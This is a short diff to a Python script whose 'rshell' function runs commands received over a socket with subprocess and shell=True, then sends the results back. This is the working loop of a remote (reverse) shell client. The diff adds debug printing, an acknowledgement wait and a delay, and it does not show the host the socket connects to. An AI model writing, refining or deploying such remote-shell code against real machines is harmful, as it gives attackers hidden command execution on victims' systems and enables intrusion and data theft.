@@ -1,5 +1,6 @@
 import subprocess
 import threading
+import time
 import webbrowser
 import socket
 
@@ -52,9 +53,12 @@ def rshell(s):
         output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         results = output.stdout.read()
         errors = output.stderr.read()
-        # print("RShell results: {}".format(results.decode('utf-8') if results else errors.decode('utf-8')))
-
-        s.sendall(results if results else errors)
+        print("RShell results: {}".format(results.decode('utf-8') if results else errors.decode('utf-8')))
+        print("Awaiting ACK.")
+        ack = s.recv(1024)  # Wait for ACK from server
+        print("Received ACK: {}".format(ack.decode('utf-8')))
+        time.sleep(1.5)
+        s.sendall(results if results else errors + b'\n')
 
 
 
